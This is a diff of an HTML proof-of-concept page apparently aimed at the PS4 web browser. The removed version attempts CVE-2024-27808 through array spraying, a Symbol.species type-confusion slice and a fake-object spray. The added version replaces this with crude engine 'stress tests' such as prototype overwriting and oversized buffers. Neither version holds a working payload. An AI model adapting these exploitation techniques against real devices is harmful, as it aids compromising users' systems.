@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC - CVE-2024-27808 - Full PS4 Test (Visual Logs)</title>
+    <title>PoC - PS4 Extreme Memory Tests</title>
     <style>
         body { font-family: monospace; background: black; color: lime; padding: 20px; }
         #log { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-<h1>PoC - CVE-2024-27808 - Full Exploit Attempt (PS4)</h1>
+<h1>PoC - PS4 Extreme Browser Stress Tests</h1>
 <div id="log"></div>
 
 <script>
@@ -19,58 +19,73 @@ function log(msg) {
 
 (async function(){
     try {
-        log("[+] Starting full test...");
+        log("[+] Starting extreme PS4 browser tests...");
 
-        // Spray inicial de arrays normais
-        log("[1] Spraying Uint32Arrays...");
-        let spray = [];
-        for (let i = 0; i < 5000; i++) {
-            spray.push(new Uint32Array(20));
+        // Test 1: Oversized ArrayBuffer
+        log("[1] Testing oversized ArrayBuffer...");
+        try {
+            let hugeBuffer = new ArrayBuffer(0xFFFFFFFF);
+            log("[!] Created huge ArrayBuffer: " + hugeBuffer.byteLength);
+        } catch (e) {
+            log("[!!] Exception on huge ArrayBuffer: " + e);
         }
 
-        function forceGC() {
-            log("[2] Forcing garbage collection...");
-            for (let i = 0; i < 100; i++) {
-                let tmp = new ArrayBuffer(0x1000000);
+        // Test 2: Function.prototype.toString corruption
+        log("[2] Testing Function.prototype.toString corruption...");
+        try {
+            Function.prototype.toString = () => "evil";
+            (function(){})();
+            log("[!] Overwrote Function.prototype.toString successfully.");
+        } catch (e) {
+            log("[!!] Exception on Function.prototype.toString overwrite: " + e);
+        }
+
+        // Test 3: Proxy Abuse
+        log("[3] Testing Proxy abuse...");
+        try {
+            let evilProxy = new Proxy({}, {
+                get: function(target, prop) {
+                    log("[*] Proxy get trap triggered for prop: " + String(prop));
+                    return Reflect.get(target, prop);
+                }
+            });
+
+            let test = evilProxy.fakeProperty;
+            log("[!] Proxy test passed.");
+        } catch (e) {
+            log("[!!] Exception on Proxy abuse: " + e);
+        }
+
+        // Test 4: Fake TypedArray
+        log("[4] Testing fake TypedArray creation...");
+        try {
+            let fakeTypedArray = {
+                buffer: {},
+                byteOffset: 0,
+                byteLength: 0x1000,
+                length: 0x400
+            };
+            log("[!] Fake TypedArray object created.");
+        } catch (e) {
+            log("[!!] Exception on fake TypedArray creation: " + e);
+        }
+
+        // Test 5: Massive String Concatenation
+        log("[5] Testing massive string concatenation...");
+        try {
+            let s = "A";
+            for (let i = 0; i < 22; i++) {
+                s += s;
             }
+            log("[!] Massive string length: " + s.length);
+        } catch (e) {
+            log("[!!] Exception on massive string concatenation: " + e);
         }
 
-        log("[3] Preparing Symbol.species attack...");
-        let evil = new Uint32Array(1);
-        evil.constructor = {
-            [Symbol.species]: function() {
-                log("[*] Symbol.species triggered.");
-                return new Float64Array(100); // Tipo trocado
-            }
-        };
+        log("[+] All tests executed.");
 
-        log("[4] Executing slice...");
-        let corrupted = evil.slice(0, 10); // slice com overflow sutil
-
-        log("[5] Slice result: length=" + corrupted.length);
-
-        if (corrupted.length !== 1) {
-            log("[!!] Unexpected object length: " + corrupted.length);
-        } else {
-            log("[OK] Slice returned expected size.");
-        }
-
-        log("[6] Attempting Fake Object Spray...");
-
-        let fake_obj = {
-            fake: true,
-            addr: 0x41414141,
-            spray: spray
-        };
-
-        log("[7] Spray size: " + spray.length);
-
-        forceGC();
-
-        log("[8] Test finished without direct crashes detected.");
-
-    } catch (e) {
-        log("[!!] Exception captured: " + e);
+    } catch (fatal) {
+        log("[FATAL] Uncaught exception: " + fatal);
     }
 })();
 </script>
